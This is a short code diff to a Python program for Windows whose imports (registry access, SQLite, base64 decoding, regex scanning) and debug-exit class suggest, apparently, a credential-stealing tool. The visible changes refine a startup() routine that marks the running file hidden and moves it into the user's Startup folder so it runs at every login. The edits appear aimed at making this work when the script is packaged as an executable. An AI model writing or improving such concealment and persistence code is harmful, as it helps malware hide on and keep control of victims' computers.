@@ -2,12 +2,13 @@ import base64
 import difflib
 import json
 import os
+import sys
 import winreg
 from base64 import b64decode
 from json import load, loads
 from platform import platform
 from re import findall, match
-from shutil import copy2, move as movefile
+from shutil import copy2
 from sqlite3 import connect
 from subprocess import PIPE, Popen
 from threading import Thread
@@ -514,12 +515,12 @@ class debug:
         exit()
 
 def startup():
-    cwf = r"{}\{}".format(os.getcwd(), os.path.basename(__file__))
-    startup = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}".format(os.getlogin(), os.path.basename(__file__))
+    cwf = r"{}\{}".format(os.getcwd(), os.path.basename(sys.argv[0]))
+    startup = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}".format(os.getlogin(), os.path.basename(sys.argv[0]))
 
     if not cwf == startup:
         SetFileAttributes(cwf, FILE_ATTRIBUTE_HIDDEN)
-        movefile(cwf, startup)   
+        os.rename(cwf, startup)  
                             
 if __name__ == '__main__':
     if os.name != "nt":
